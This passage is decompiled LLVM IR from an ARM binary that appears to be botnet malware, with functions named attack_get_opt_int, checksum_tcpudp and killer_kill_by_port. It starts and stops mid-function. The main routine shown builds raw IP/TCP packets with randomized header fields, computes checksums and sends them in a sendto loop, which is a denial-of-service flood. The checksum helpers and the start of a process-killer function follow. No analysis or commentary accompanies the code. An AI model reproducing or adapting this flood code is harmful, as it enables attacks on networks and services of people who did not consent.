  br i1 %tmp67, label %dec_label_pc_c788, label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c678
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6b0, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v1_c6bc = phi i32 [ %v1_c7f8, %dec_label_pc_c7e8 ], [ 65535, %dec_label_pc_c6a4 ]
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v9_c6bc = icmp eq i32 %v3_c3f8, %v1_c6bc
  store i1 %v9_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6bc, label %dec_label_pc_c818, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge ], [ %v1_c6bc, %dec_label_pc_c6b8 ]
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c3fc, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c82c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c6d4.pre, %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v5_c2c8, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c840, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge, %dec_label_pc_c6d0
  %v1_c6e0 = phi i32 [ %v1_c6e0.pre, %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge ], [ %v1_c6d4, %dec_label_pc_c6d0 ]
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v9_c6e0 = icmp eq i32 %v6_c2e0, %v1_c6e0
  store i1 %v9_c6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6e0, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c6e8 = load i32, i32* @fp, align 4
  %v2_c6e8 = icmp eq i32 %v0_c6e8, 0
  store i1 %v2_c6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854, %dec_label_pc_c864
  %v2_c6f4 = load i32, i32* @r5, align 4
  %v3_c6f4 = add i32 %v2_c6f4, 10
  %v4_c6f4 = inttoptr i32 %v3_c6f4 to i16*
  store i16 0, i16* %v4_c6f4, align 2
  %v0_c6f8 = load i32, i32* @r5, align 4
  store i32 %v0_c6f8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c700 = call i32 @checksum_generic(i32 %v0_c6f8, i32 20)
  %v3_c700 = trunc i32 %v2_c700 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c708 = load i32, i32* @r5, align 4
  %v4_c708 = add i32 %v3_c708, 10
  %v5_c708 = inttoptr i32 %v4_c708 to i16*
  store i16 %v3_c700, i16* %v5_c708, align 2
  %v0_c70c = load i32, i32* @r6, align 4
  store i32 %v0_c70c, i32* @r1, align 4
  %v0_c710 = load i32, i32* %r2.global-to-local, align 4
  %v1_c710 = trunc i32 %v0_c710 to i16
  %v3_c710 = add i32 %v0_c70c, 16
  %v4_c710 = inttoptr i32 %v3_c710 to i16*
  store i16 %v1_c710, i16* %v4_c710, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v4_c720 = call i32 @checksum_tcpudp(i32 %v0_c71c, i32 %v0_c70c, i32 10240, i32 40)
  %v5_c720 = trunc i32 %v4_c720 to i16
  store i32 %v4_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c724, i32* %r3.global-to-local, align 4
  %v3_c728 = mul i32 %v3_c724, 32
  store i32 %v3_c728, i32* %lr.global-to-local, align 4
  %v3_c72c = load i32, i32* @r6, align 4
  %v4_c72c = add i32 %v3_c72c, 16
  %v5_c72c = inttoptr i32 %v4_c72c to i16*
  store i16 %v5_c720, i16* %v5_c72c, align 2
  %v0_c730 = load i32, i32* %lr.global-to-local, align 4
  %v1_c730 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c730, -8
  %v5_c730 = add i32 %v0_c730, %tmp68
  store i32 %v5_c730, i32* %lr.global-to-local, align 4
  %v0_c734 = load i32, i32* @r6, align 4
  %v1_c734 = add i32 %v0_c734, 2
  %v2_c734 = inttoptr i32 %v1_c734 to i16*
  %v3_c734 = load i16, i16* %v2_c734, align 2
  %v4_c734 = zext i16 %v3_c734 to i32
  store i32 %v4_c734, i32* @r6, align 4
  %v1_c738 = load i32, i32* @r8, align 4
  %v2_c738 = add i32 %v1_c738, %v5_c730
  store i32 %v2_c738, i32* @lr, align 4
  %v3_c73c = add i32 %v2_c738, 2
  %v4_c73c = inttoptr i32 %v3_c73c to i16*
  store i16 %v3_c734, i16* %v4_c73c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c748 = load i32, i32* @r5, align 4
  store i32 %v0_c748, i32* %r1.global-to-local, align 4
  %v0_c74c = load i32, i32* @sl, align 4
  store i32 %v0_c74c, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @lr, align 4
  %v6_c75c = call i32 @__libc_sendto(i32 %v0_c74c, i32 %v0_c748, i32 60, i32 16384, i32 %v0_c754, i32 16)
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  %v1_c764 = add i32 %v3_c760, 1
  store i32 %v1_c764, i32* %r0.global-to-local, align 4
  %v1_c768 = load i32, i32* @r7, align 4
  %v9_c768 = icmp eq i32 %v1_c764, %v1_c768
  store i1 %v9_c768, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c764, i32* %stack_var_-44, align 4
  %v5_c770 = icmp slt i32 %v1_c764, %v1_c768
  br i1 %v5_c770, label %dec_label_pc_c678, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c6f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c778 = icmp eq i32 %v1_c768, 0
  store i1 %v2_c778, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c778, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c788:                                ; preds = %dec_label_pc_c678
  %v1_c788 = add i32 %v2_c680, 16
  %v2_c788 = inttoptr i32 %v1_c788 to i32*
  %v3_c788 = load i32, i32* %v2_c788, align 4
  store i32 %v3_c788, i32* %r4.global-to-local, align 4
  %v0_c78c = call i32 @rand_next()
  store i32 %v0_c78c, i32* %r0.global-to-local, align 4
  %v3_c790 = load i32, i32* %stack_var_-44, align 4
  %v5_c798 = mul i32 %v3_c790, 24
  %v0_c79c = load i32, i32* %r4.global-to-local, align 4
  %v1_c79c = and i32 %v0_c79c, 16711680
  %v3_c7a0 = udiv i32 %v0_c79c, 16777216
  %v4_c7a4 = udiv i32 %v1_c79c, 256
  %v5_c7a4 = or i32 %v4_c7a4, %v3_c7a0
  store i32 %v5_c7a4, i32* %r2.global-to-local, align 4
  %v1_c7a8 = load i32, i32* @r8, align 4
  %v2_c7a8 = add i32 %v1_c7a8, %v5_c798
  store i32 %v2_c7a8, i32* %r1.global-to-local, align 4
  %v1_c7ac = and i32 %v0_c79c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_c7ac, i32* %r3.global-to-local, align 4
  %v1_c7b0 = add i32 %v2_c7a8, 20
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i8*
  %v3_c7b0 = load i8, i8* %v2_c7b0, align 1
  %v4_c7b0 = zext i8 %v3_c7b0 to i32
  %v4_c7b4 = mul i32 %v1_c7ac, 256
  %v4_c7b8 = mul i32 %v0_c79c, 16777216
  %v5_c7b4 = or i32 %v4_c7b4, %v4_c7b8
  %v5_c7b8 = or i32 %v5_c7b4, %v5_c7a4
  %v7_c7bc = lshr i32 %v0_c78c, %v4_c7b0
  %v8_c7bc = add i32 %v7_c7bc, %v5_c7b8
  store i32 %v8_c7bc, i32* %r2.global-to-local, align 4
  %v1_c7c0 = and i32 %v8_c7bc, 16711680
  store i32 %v1_c7c0, i32* %r0.global-to-local, align 4
  %v1_c7cc = and i32 %v8_c7bc, 65280
  store i32 %v1_c7cc, i32* %r1.global-to-local, align 4
  %v5_c7d4 = call i32 @llvm.bswap.i32(i32 %v8_c7bc)
  %v1_c7d8 = load i32, i32* @r5, align 4
  %v2_c7d8 = add i32 %v1_c7d8, 16
  %v3_c7d8 = inttoptr i32 %v2_c7d8 to i32*
  store i32 %v5_c7d4, i32* %v3_c7d8, align 4
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  %v0_c7e8 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_c7f0 = load i32, i32* @r5, align 4
  %v2_c7f0 = add i32 %v1_c7f0, 12
  %v3_c7f0 = inttoptr i32 %v2_c7f0 to i32*
  store i32 %v0_c7e8, i32* %v3_c7f0, align 4
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  %v0_c7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_c7f8 = add i32 %v0_c7f8, -1
  store i32 %v1_c7f8, i32* @r4, align 4
  %v9_c7fc = icmp eq i32 %v3_c3f4, %v1_c7f8
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7fc, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c804:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v0_c804 = call i32 @rand_next()
  %v1_c804 = trunc i32 %v0_c804 to i16
  store i32 %v0_c804, i32* %r0.global-to-local, align 4
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v1_c80c = load i32, i32* @r4, align 4
  %v9_c80c = icmp eq i32 %v3_c3f8, %v1_c80c
  store i1 %v9_c80c, i1* %cpsr_z.global-to-local, align 1
  %v3_c810 = load i32, i32* @r5, align 4
  %v4_c810 = add i32 %v3_c810, 4
  %v5_c810 = inttoptr i32 %v4_c810 to i16*
  store i16 %v1_c804, i16* %v5_c810, align 2
  br i1 %v9_c80c, label %dec_label_pc_c818, label %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge

dec_label_pc_c804.dec_label_pc_c6c4_crit_edge:    ; preds = %dec_label_pc_c804
  %v1_c6c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6c4

dec_label_pc_c818:                                ; preds = %dec_label_pc_c804, %dec_label_pc_c6b8
  %v0_c818 = call i32 @rand_next()
  %v1_c818 = trunc i32 %v0_c818 to i16
  store i32 %v0_c818, i32* %r0.global-to-local, align 4
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v1_c820 = load i32, i32* @r4, align 4
  %v9_c820 = icmp eq i32 %v3_c3fc, %v1_c820
  store i1 %v9_c820, i1* %cpsr_z.global-to-local, align 1
  %v3_c824 = load i32, i32* @r5, align 4
  %v4_c824 = add i32 %v3_c824, 20
  %v5_c824 = inttoptr i32 %v4_c824 to i16*
  store i16 %v1_c818, i16* %v5_c824, align 2
  br i1 %v9_c820, label %dec_label_pc_c82c, label %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge

dec_label_pc_c818.dec_label_pc_c6d0_crit_edge:    ; preds = %dec_label_pc_c818
  %v1_c6d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c82c:                                ; preds = %dec_label_pc_c818, %dec_label_pc_c6c4
  %v0_c82c = call i32 @rand_next()
  %v1_c82c = trunc i32 %v0_c82c to i16
  store i32 %v0_c82c, i32* %r0.global-to-local, align 4
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v1_c834 = load i32, i32* @r4, align 4
  %v9_c834 = icmp eq i32 %v5_c2c8, %v1_c834
  store i1 %v9_c834, i1* %cpsr_z.global-to-local, align 1
  %v3_c838 = load i32, i32* @r6, align 4
  %v4_c838 = add i32 %v3_c838, 2
  %v5_c838 = inttoptr i32 %v4_c838 to i16*
  store i16 %v1_c82c, i16* %v5_c838, align 2
  br i1 %v9_c834, label %dec_label_pc_c840, label %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge

dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge:    ; preds = %dec_label_pc_c82c
  %v1_c6e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c840:                                ; preds = %dec_label_pc_c82c, %dec_label_pc_c6d0
  %v0_c840 = call i32 @rand_next()
  %v1_c844 = load i32, i32* @r6, align 4
  %v2_c844 = add i32 %v1_c844, 4
  %v3_c844 = inttoptr i32 %v2_c844 to i32*
  store i32 %v0_c840, i32* %v3_c844, align 4
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v1_c84c = load i32, i32* @r4, align 4
  %v9_c84c = icmp eq i32 %v6_c2e0, %v1_c84c
  store i1 %v9_c84c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c84c, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c854:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c854 = call i32 @rand_next()
  store i32 %v0_c854, i32* %r0.global-to-local, align 4
  %v0_c858 = load i32, i32* @fp, align 4
  %v2_c858 = icmp eq i32 %v0_c858, 0
  store i1 %v2_c858, i1* %cpsr_z.global-to-local, align 1
  %v1_c85c = load i32, i32* @r6, align 4
  %v2_c85c = add i32 %v1_c85c, 8
  %v3_c85c = inttoptr i32 %v2_c85c to i32*
  store i32 %v0_c854, i32* %v3_c85c, align 4
  br i1 %v2_c858, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c864:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854
  %v0_c864 = call i32 @rand_next()
  %v1_c864 = trunc i32 %v0_c864 to i16
  store i32 %v0_c864, i32* %r0.global-to-local, align 4
  %v3_c868 = load i32, i32* @r6, align 4
  %v4_c868 = add i32 %v3_c868, 18
  %v5_c868 = inttoptr i32 %v4_c868 to i16*
  store i16 %v1_c864, i16* %v5_c868, align 2
  br label %dec_label_pc_c6f0

dec_label_pc_c870:                                ; preds = %dec_label_pc_c3b0
  %v0_c870 = load i32, i32* @sl, align 4
  store i32 %v0_c870, i32* %r0.global-to-local, align 4
  %v1_c874 = call i32 @__GI___libc_close(i32 %v0_c870)
  store i32 %v1_c874, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %entry, %dec_label_pc_c870
  %v1_c880 = phi i32 [ %v3_c3a0, %entry ], [ %v1_c874, %dec_label_pc_c870 ]
  store i32 %v3_c1dc, i32* %r4.global-to-local, align 4
  store i32 %v24_c1dc, i32* %fp.global-to-local, align 4
  store i32 %v27_c1dc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c880

; uselistorder directives
  uselistorder i32 %v0_c864, { 1, 0 }
  uselistorder i32 %v0_c82c, { 1, 0 }
  uselistorder i32 %v0_c818, { 1, 0 }
  uselistorder i32 %v0_c804, { 1, 0 }
  uselistorder i32 %v1_c7f8, { 1, 2, 0 }
  uselistorder i32 %v0_c79c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_c764, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c730, { 1, 0 }
  uselistorder i32 %v4_c720, { 1, 0 }
  uselistorder i1 %v3_c6b0, { 1, 0 }
  uselistorder i32 %v2_c654, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c4bc, { 1, 2, 0 }
  uselistorder i32 %v1_c488, { 2, 1, 0 }
  uselistorder i32 %v1_c484, { 2, 0, 1 }
  uselistorder i32 %v1_c480, { 2, 0, 1 }
  uselistorder i32 %v1_c47c, { 2, 0, 1 }
  uselistorder i32 %v1_c458, { 1, 0 }
  uselistorder i32 %v3_c3f4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_c3e8, { 1, 0, 2 }
  uselistorder i32 %v0_c3e4, { 1, 0, 3, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i1 %v7_c3a4, { 1, 0 }
  uselistorder i32 %v3_c3a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c38c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_c2e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_c2c8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_c24c, { 1, 0 }
  uselistorder i32 %v7_c234, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 106, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c878, { 1, 0 }
  uselistorder label %dec_label_pc_c864, { 1, 0 }
  uselistorder label %dec_label_pc_c6f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c664, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8ac, label %dec_label_pc_c894

dec_label_pc_c894:                                ; preds = %entry
  %v0_c89c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %dec_label_pc_c898, %dec_label_pc_c894
  %v0_c8a4 = phi i32 [ %v2_c8a4, %dec_label_pc_c898 ], [ 0, %dec_label_pc_c894 ]
  %v0_c89c = phi i32 [ %v5_c89c, %dec_label_pc_c898 ], [ %v0_c89c.pre, %dec_label_pc_c894 ]
  %v0_c898 = phi i32 [ %v1_c898, %dec_label_pc_c898 ], [ %arg1, %dec_label_pc_c894 ]
  %v1_c898 = add i32 %v0_c898, -2
  %v1_c89c = inttoptr i32 %v0_c89c to i16*
  %v2_c89c = load i16, i16* %v1_c89c, align 2
  %v3_c89c = zext i16 %v2_c89c to i32
  %v5_c89c = add i32 %v0_c89c, -2
  store i32 %v5_c89c, i32* @r0, align 4
  %v2_c8a4 = add i32 %v3_c89c, %v0_c8a4
  %v1_c898.cmp = icmp ugt i32 %v1_c898, 1
  br i1 %v1_c898.cmp, label %dec_label_pc_c898, label %dec_label_pc_c8ac.loopexit

dec_label_pc_c8ac.loopexit:                       ; preds = %dec_label_pc_c898
  br label %dec_label_pc_c8ac

dec_label_pc_c8ac:                                ; preds = %entry, %dec_label_pc_c8ac.loopexit
  %v1_c8b4 = phi i32 [ %v2_c8a4, %dec_label_pc_c8ac.loopexit ], [ 0, %entry ]
  %v0_c8ac = phi i32 [ %v1_c898, %dec_label_pc_c8ac.loopexit ], [ %arg1, %entry ]
  %v7_c8ac = icmp eq i32 %v0_c8ac, 1
  br i1 %v7_c8ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8ac
  %v1_c8b0 = load i32, i32* @r0, align 4
  %v2_c8b0 = inttoptr i32 %v1_c8b0 to i8*
  %v3_c8b0 = load i8, i8* %v2_c8b0, align 1
  %v4_c8b0 = zext i8 %v3_c8b0 to i32
  %v3_c8b4 = add i32 %v1_c8b4, %v4_c8b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8ac, %bb
  %v0_c8b8 = phi i32 [ %v1_c8b4, %dec_label_pc_c8ac ], [ %v3_c8b4, %bb ]
  %v3_c8bc = urem i32 %v0_c8b8, 65536
  %v4_c8c0 = udiv i32 %v0_c8b8, 65536
  %v5_c8c0 = add nuw nsw i32 %v4_c8c0, %v3_c8bc
  %v4_c8c4 = udiv i32 %v5_c8c0, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v5_c8c0
  %v1_c8c8 = urem i32 %v5_c8c4, 65536
  %v3_c8d0 = xor i32 %v1_c8c8, 65535
  ret i32 %v3_c8d0

; uselistorder directives
  uselistorder i32 %v5_c8c0, { 1, 0 }
  uselistorder i32 %v5_c89c, { 1, 0 }
  uselistorder i32 %v1_c898, { 1, 0, 2 }
  uselistorder i32 %v0_c89c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8e8 = add i32 %arg1, 12
  %v2_c8e8 = inttoptr i32 %v1_c8e8 to i32*
  %v3_c8e8 = load i32, i32* %v2_c8e8, align 4
  %v1_c8ec = add i32 %arg1, 16
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v7_c8f0 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f0, label %dec_label_pc_c8fc.preheader, label %dec_label_pc_c910

dec_label_pc_c8fc.preheader:                      ; preds = %entry
  %v0_c900.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c8fc

dec_label_pc_c8fc:                                ; preds = %dec_label_pc_c8fc.preheader, %dec_label_pc_c8fc
  %v0_c908 = phi i32 [ 0, %dec_label_pc_c8fc.preheader ], [ %v2_c908, %dec_label_pc_c8fc ]
  %v0_c900 = phi i32 [ %v0_c900.pre, %dec_label_pc_c8fc.preheader ], [ %v5_c900, %dec_label_pc_c8fc ]
  %v0_c8fc = phi i32 [ %arg3, %dec_label_pc_c8fc.preheader ], [ %v1_c8fc, %dec_label_pc_c8fc ]
  %v1_c8fc = add nsw i32 %v0_c8fc, -2
  %v1_c900 = inttoptr i32 %v0_c900 to i16*
  %v2_c900 = load i16, i16* %v1_c900, align 2
  %v3_c900 = zext i16 %v2_c900 to i32
  %v5_c900 = add i32 %v0_c900, -2
  store i32 %v5_c900, i32* @r1, align 4
  %v2_c908 = add i32 %v3_c900, %v0_c908
  %v8_c90c = icmp sgt i32 %v1_c8fc, 1
  br i1 %v8_c90c, label %dec_label_pc_c8fc, label %dec_label_pc_c910.loopexit

dec_label_pc_c910.loopexit:                       ; preds = %dec_label_pc_c8fc
  br label %dec_label_pc_c910

dec_label_pc_c910:                                ; preds = %dec_label_pc_c910.loopexit, %entry
  %v1_c91c = phi i32 [ %v2_c908, %dec_label_pc_c910.loopexit ], [ 0, %entry ]
  %v0_c910 = phi i32 [ %v1_c8fc, %dec_label_pc_c910.loopexit ], [ %arg3, %entry ]
  %v7_c910 = icmp eq i32 %v0_c910, 1
  br i1 %v7_c910, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c910
  br label %bb19

bb:                                               ; preds = %dec_label_pc_c910
  %v1_c914 = load i32, i32* @r1, align 4
  %v2_c914 = inttoptr i32 %v1_c914 to i8*
  %v3_c914 = load i8, i8* %v2_c914, align 1
  %v4_c914 = zext i8 %v3_c914 to i32
  %v3_c91c = add i32 %v4_c914, %v1_c91c
  br label %bb19

bb19:                                             ; preds = %.thread, %bb
  %v1_c944 = phi i32 [ %v1_c91c, %.thread ], [ %v3_c91c, %bb ]
  %v0_c924 = mul i32 %v3_c8e8, 65536
  %v3_c924 = udiv i32 %v0_c924, 65536
  %v3_c928 = urem i32 %v3_c8ec, 65536
  %v4_c930 = udiv i32 %v3_c8e8, 65536
  %v2_c92c = add nuw nsw i32 %v3_c928, %v4_c930
  %v5_c930 = add nuw nsw i32 %v2_c92c, %v3_c924
  %v1_c934 = add i32 %arg1, 9
  %v2_c934 = inttoptr i32 %v1_c934 to i8*
  %v3_c934 = load i8, i8* %v2_c934, align 1
  %v4_c934 = zext i8 %v3_c934 to i32
  %v4_c938 = udiv i32 %v3_c8ec, 65536
  %v3_c940 = mul nuw nsw i32 %v4_c934, 256
  %v5_c938 = add i32 %v4_c938, %arg2
  %v2_c93c = add i32 %v5_c938, %v1_c944
  %v2_c944 = add i32 %v2_c93c, %v5_c930
  %v2_c948 = add i32 %v2_c944, %v3_c940
  %tmp = icmp ult i32 %v2_c948, 65536
  br i1 %tmp, label %dec_label_pc_c968, label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %bb19, %dec_label_pc_c954
  %v2_c95c5 = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606.in = phi i32 [ %v2_c95c, %dec_label_pc_c954 ], [ %v2_c948, %bb19 ]
  %v3_c9606 = udiv i32 %v3_c9606.in, 65536
  %v3_c958 = urem i32 %v2_c95c5, 65536
  %v2_c95c = add nuw nsw i32 %v3_c958, %v3_c9606
  %tmp20 = icmp ult i32 %v2_c95c, 65536
  br i1 %tmp20, label %dec_label_pc_c968.loopexit, label %dec_label_pc_c954

dec_label_pc_c968.loopexit:                       ; preds = %dec_label_pc_c954
  br label %dec_label_pc_c968

dec_label_pc_c968:                                ; preds = %dec_label_pc_c968.loopexit, %bb19
  %v0_c968 = phi i32 [ %v2_c95c, %dec_label_pc_c968.loopexit ], [ %v2_c948, %bb19 ]
  %v1_c968 = urem i32 %v0_c968, 65536
  %v3_c970 = xor i32 %v1_c968, 65535
  ret i32 %v3_c970

; uselistorder directives
  uselistorder i32 %v2_c95c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_c948, { 3, 0, 2, 1 }
  uselistorder i32 %v1_c91c, { 1, 0 }
  uselistorder i32 %v5_c900, { 1, 0 }
  uselistorder i32 %v0_c900, { 1, 0 }
  uselistorder i32 %v3_c8e8, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c954, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_c8fc, { 1, 0 }
}

define i32 @killer_kill_by_port(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
